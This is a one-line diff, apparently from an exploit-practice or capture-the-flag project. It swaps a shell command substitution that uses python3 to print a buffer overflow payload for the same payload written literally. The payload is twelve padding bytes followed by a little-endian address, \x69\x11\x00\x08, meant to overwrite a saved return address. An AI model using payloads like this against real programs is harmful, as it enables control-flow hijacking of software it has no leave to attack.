@@ -1,1 +1,1 @@
-$(python3 -c "print('AAaAaaaaaaaa\x69\x11\x00\x08')")
+AAaAaaaaaaaa\x69\x11\x00\x08
